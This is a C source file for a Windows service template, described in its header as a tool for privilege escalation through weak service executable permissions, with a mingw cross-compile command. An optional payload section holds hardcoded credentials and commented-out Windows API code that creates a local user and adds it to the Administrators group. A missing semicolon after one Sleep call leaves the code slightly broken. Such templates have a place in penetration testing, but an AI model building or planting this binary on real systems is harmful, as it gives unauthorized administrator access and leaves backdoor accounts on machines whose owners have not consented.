/* Minimal Service Template

   useful for privileg escalation exploiting
   weak service executable permissions

   cross-compile using mingw:
     x86_64-w64-mingw32-gcc service.c -lnetapi32 -s -o service.exe
*/

#include <windows.h>
#include <stdio.h>
#include <lm.h>

#ifndef SERVICE_NAME
#define SERVICE_NAME "DummyService"
#endif

#ifdef INCLUDE_PAYLOAD
#define USERNAME L"testadmin"
#define PASSWORD L"myP@ssw0rd!"
#define GROUP L"Administrators"
#endif

SERVICE_STATUS ServiceStatus; 
SERVICE_STATUS_HANDLE hStatus; 
  
void ServiceMain(int argc, char** argv); 
void ControlHandler(DWORD request); 
int InitService();

#ifdef INCLUDE_PAYLOAD

void Payload(void)
{
  // DO NOTHING BUT SLEEP
  Sleep(300)
/* sample Payload: add local admin user using Windows API */
  // DWORD dwLevel = 1;
  // DWORD dwError = 0;
  // USER_INFO_1 ui;
  // ui.usri1_name = USERNAME;
  // ui.usri1_password = PASSWORD;
  // ui.usri1_priv = USER_PRIV_USER;
  // ui.usri1_home_dir = NULL;
  // ui.usri1_comment = L"test user";
  // ui.usri1_flags = UF_SCRIPT;
  // ui.usri1_script_path = NULL;
  // NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, &dwError);

  // DWORD dwEntries = 1;
  // dwLevel = 3;
  // LOCALGROUP_MEMBERS_INFO_3 mi;
  // mi.lgrmi3_domainandname = USERNAME;
  // NetLocalGroupAddMembers(NULL, GROUP, dwLevel, (LPBYTE)&mi, dwEntries);
}
#endif

void main() 
{
  SERVICE_TABLE_ENTRY ServiceTable[] =
    {{ SERVICE_NAME, (LPSERVICE_MAIN_FUNCTION)ServiceMain },
     { NULL, NULL }};
  StartServiceCtrlDispatcher(ServiceTable);  
}
 
void ServiceMain(int argc, char** argv) 
{ 
  int error; 

  hStatus = RegisterServiceCtrlHandler(SERVICE_NAME, (LPHANDLER_FUNCTION)ControlHandler);
  
  if (hStatus == (SERVICE_STATUS_HANDLE)0) { return; }
  
  ServiceStatus.dwServiceType        = SERVICE_WIN32; 
  ServiceStatus.dwCurrentState       = SERVICE_START_PENDING; 
  ServiceStatus.dwControlsAccepted   = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
  ServiceStatus.dwWin32ExitCode      = 0; 
  ServiceStatus.dwServiceSpecificExitCode = 0; 
  ServiceStatus.dwCheckPoint         = 0; 
  ServiceStatus.dwWaitHint           = 0; 
  
  error = InitService(); 
  if (error) 
    {
      ServiceStatus.dwCurrentState       = SERVICE_STOPPED; 
      ServiceStatus.dwWin32ExitCode      = -1; 
      SetServiceStatus(hStatus, &ServiceStatus); 
      return; 
    } 

  ServiceStatus.dwCurrentState = SERVICE_RUNNING; 
  SetServiceStatus(hStatus, &ServiceStatus);
  
  while (ServiceStatus.dwCurrentState == SERVICE_RUNNING) {
    int result;
    
    /* Do nothing but loop once every 5 minutes */
    while(1)
      {
	Sleep(300);         
      }
  }
  return; 
}
  
int InitService() 
{ 
#ifdef INCLUDE_PAYLOAD
    Payload();
#endif
    return 0;
} 
 
void ControlHandler(DWORD request)
{ 
  switch(request)
    { 
    case SERVICE_CONTROL_STOP: 
      ServiceStatus.dwWin32ExitCode = 0; 
      ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
      SetServiceStatus(hStatus, &ServiceStatus);
      return; 
  
    case SERVICE_CONTROL_SHUTDOWN: 
      ServiceStatus.dwWin32ExitCode = 0; 
      ServiceStatus.dwCurrentState  = SERVICE_STOPPED; 
      SetServiceStatus (hStatus, &ServiceStatus);
      return; 
         
    default:
      break;
    }

  SetServiceStatus (hStatus,  &ServiceStatus);
  
  return; 
}
